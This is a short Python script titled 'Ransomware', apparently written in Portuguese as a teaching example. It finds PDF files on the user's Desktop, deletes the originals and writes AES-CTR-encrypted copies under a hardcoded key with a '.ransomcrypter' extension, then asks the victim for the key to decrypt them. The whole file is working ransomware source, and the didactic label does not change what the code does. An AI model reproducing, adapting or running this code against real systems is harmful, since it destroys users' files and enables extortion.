"""
Ransomware - 0.0.0.0

By Carlos Henrique Barros Silva Campos

OBS: Script para total didática.
"""
import os
import glob
import time
import pyaes
from pathlib import Path

lst_arq = ["*.pdf"]

print('Criptografando')
time.sleep(3)

# Entra no Desktop e faz a verificação
try:
    desktop = Path.home() / "Desktop"
#    download = Path.home() / "Downloads"
except Exception:
    pass

os.chdir(desktop)


def criptografando():
    for files in lst_arq:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{desktop}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_file}')
            key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # Salvando arquivo novo (.ransomcrypter)

            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()


def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes  # 16 bytes key - change for your key
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]  # Path to drop file

            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida')


if __name__ == '__main__':
    criptografando()
    if criptografando:
        key = input('Seu PC foi criptografado informe a chave  para liberar os arquivos:')
        if key == '1ab2c3e4f5g6h7i8':
            descrypt(key)
            for del_file in glob.glob('*.ransomcrypter'):
                os.remove(f'{desktop}\\{del_file}')
        else:
            print('Chave de liberação inválida!!!')

